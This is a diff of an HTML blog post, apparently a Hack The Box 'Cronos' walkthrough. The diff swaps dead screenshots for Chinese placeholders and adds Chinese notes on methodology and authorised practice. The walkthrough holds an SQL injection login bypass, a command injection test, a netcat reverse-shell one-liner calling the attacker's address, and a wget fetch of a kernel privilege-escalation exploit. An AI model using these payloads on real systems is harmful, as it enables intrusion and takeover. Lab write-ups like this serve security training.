@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-cn">
 <head>
 
   <meta charset="utf-8" />
@@ -211,17 +211,23 @@
       <h1 class="post-title">Cronos -- hack the box</h1>
       <p class="post-meta">@Neal · Mar 15, 2019 · 9 min read</p>
     </header>
-    <article class="post-content"><p><img src="https://s2.ax1x.com/2019/03/14/AEpKkq.png" alt="AEpKkq.png"></p>
+    <article class="post-content"><blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <h2 id="introduction">Introduction</h2>
 <p>Target machine: 10.10.10.13(OS: linux)</p>
 <p>Kali linux: 10.10.16.44</p>
 <h2 id="enumeration">Enumeration</h2>
 <p>Firstly, detect the open ports:</p>
 <pre tabindex="0"><code>nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
-</code></pre><p><img src="https://s2.ax1x.com/2019/03/15/AE1qlF.png" alt="AE1qlF.png"></p>
+</code></pre><blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>3 ports is open, detect the detailed services:</p>
 <pre tabindex="0"><code>namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13
-</code></pre><p><img src="https://s2.ax1x.com/2019/03/15/AE1OOJ.png" alt="AE1OOJ.png"></p>
+</code></pre><blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>So we can conduct the relation of ports of ports and services as following:</p>
 <table>
 	<thead>
@@ -248,25 +254,34 @@
 <h2 id="exploitation">Exploitation</h2>
 <h3 id="http">http</h3>
 <p>As the target machine provides http service, try to access <code>http://10.10.10.13</code></p>
-<p><img src="https://s2.ax1x.com/2019/03/15/AE3V0A.png" alt="AE3V0A.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>Default apache web page, nothing new. So try to brute force <code>http://10.10.10.13/</code> with dirbuster. After brute force for a period time, we have not found anything new.</p>
 <h3 id="dns">DNS</h3>
 <p>As the target machine owns DNS service. It is common to check zone transfer with <code>dig</code>. As we can have a guess of the dns domain of <code>cronos.htb</code>. So zone transfer can be checked by:</p>
 <pre tabindex="0"><code>dig axfr @10.10.10.13 cronos.htb
-</code></pre><p><img src="https://s2.ax1x.com/2019/03/15/AE3ZTI.png" alt="AE3ZTI.png"></p>
+</code></pre><blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>An interestring domain name <code>admin.cronos.htb</code> is found. So add an entry into <code>/etc/hosts</code>:</p>
 <pre tabindex="0"><code>10.10.10.13    admin.cronos.htb
 </code></pre><p>Try to access <code>admin.cronos.htb</code> in the browser, a login web page is displayed. Yep, it is what we want. It seems that the login is quite simple. Try to login with sql injection with the username of <code>admin ' or '1' = '1</code>, the password can be anything.</p>
-<p><img src="https://s2.ax1x.com/2019/03/15/AE3mkt.png" alt="AE3mkt.png"></p>
-<p><img src="https://s2.ax1x.com/2019/03/15/AE3ntP.png" alt="AE3ntP.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>Magic! We are in. It seems that it is a network tool. However, it seems that it has exposed the ability to execute command remotely. Have a test of <code>8888&amp;whoami</code>:</p>
-<p><img src="https://s2.ax1x.com/2019/03/15/AE3l6g.png" alt="AE3l6g.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>The result is <code>www-data</code>. Obviously, the command can executed properly. Now try to reverse the shell. Try to listen to port <code>1234</code> by nc in our kali:</p>
 <pre tabindex="0"><code>nc -lvnp 1234
 </code></pre><p>Then use the bash reverse shell command:</p>
 <pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f
 </code></pre><p>Wait for server second, shell is return. Wonderful!</p>
-<p><img src="https://s2.ax1x.com/2019/03/15/AE3uff.png" alt="AE3uff.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>Try to obtain a tty terminal:</p>
 <pre tabindex="0"><code>python -c &#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;
 </code></pre><p>Obviously, the user role can be obtained. Go the <code>home</code> folder and <code>ls</code>， then go into the user folder to get user.txt.</p>
@@ -274,7 +289,9 @@
 <p>It&rsquo;s time to get the root role. See the kernel of the target machine:</p>
 <pre tabindex="0"><code>uname -a
 </code></pre><p>Google linux kernel privilege escalation, find a <a href="https://www.exploit-db.com/exploits/44298">payload</a></p>
-<p><img src="https://s2.ax1x.com/2019/03/15/AEmLVK.png" alt="AEmLVK.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>Server a http server to provide the payload, name it as exploit.c:</p>
 <pre tabindex="0"><code>pythoon -m SimpleHTTPServer 80
 </code></pre><p>There are serveal ways to provide http file services, including: php, apache, python, etc. Pyhton is quite convinient. Then download the <code>exploit.c</code> in the target machine:</p>
@@ -287,9 +304,31 @@ wget http://10.10.16.44/exploit
 </code></pre><p>Make sure to have execution perssion by:</p>
 <pre tabindex="0"><code>chmod +x exploit
 </code></pre><p>Just execute it by <code>./exploit</code>. Wow, now see whoami.</p>
-<p><img src="https://s2.ax1x.com/2019/03/15/AE31XQ.png" alt="AE31XQ.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <h2 id="conclusion">Conclusion</h2>
 <p>The target machine is quite straitforward. The basic point is the zone transfer of DNS exploit. And other steps is not difficult with basic knowledges including: sql injection, reverse shell, etc.</p>
+<h2 id="writeup-方法沉淀授权靶场">Writeup 方法沉淀（授权靶场）</h2>
+<p>Cronos 类机器的通用路径仍是：</p>
+<ol>
+<li><strong>全端口扫描</strong> + 服务版本识别</li>
+<li>Web 虚拟主机 / 子域枚举（hosts 文件、DNS）</li>
+<li>已知 CMS/框架漏洞或命令注入点</li>
+<li>稳定反弹 shell 后做本机枚举</li>
+<li>定时任务 / 内核 / sudo 提权</li>
+</ol>
+<p>写 writeup 时请固定结构：<strong>信息收集 → 初始访问 → 提权 → 收获标志</strong>，并标注仅在 Hack The Box 等授权环境练习。</p>
+<h2 id="外链图说明">外链图说明</h2>
+<p>文中部分截图托管在第三方图床，可能失效。关键命令与思路以文字与代码块为准；复现时以你当时 nmap/gobuster 输出为准。</p>
+<h2 id="小结">小结</h2>
+<p>靶机价值在于训练完整攻击链，而不是背一个 IP。把枚举清单化，比死记某题的洞更重要。</p>
+<h2 id="时间盒练习法">时间盒练习法</h2>
+<p>给自己 2 小时：前 40 分钟只做枚举不利用，中 50 分钟打点，后 30 分钟提权与记录。超时就看官方/社区 writeup 对照差距。刻意练习比无限制熬夜刷机更提升能力。</p>
+<h2 id="延伸阅读与实践">延伸阅读与实践</h2>
+<p>把文章里的命令和配置放到自己的实验环境跑一遍，比只看结论更重要。建议同步记录：环境版本、失败现象、最终生效的配置。下次遇到同类问题时，检索自己的笔记往往比搜引擎更快。</p>
+<p>若该主题涉及安全测试，请仅在明确授权的系统或官方靶场中操作，并保留测试范围与时间窗记录，避免对生产造成误伤。</p>
+<p>对团队分享时，用「问题—影响—修复—验证」四段结构复述，有助于把个人经验沉淀为组织能力。</p>
 </article>
     <footer class="post-footer">
       
@@ -304,7 +343,7 @@ wget http://10.10.16.44/exploit
       </ul>
       
       <p class="post-copyright">
-        This post was published <strong>2703</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        
       </p>
     </footer>
     
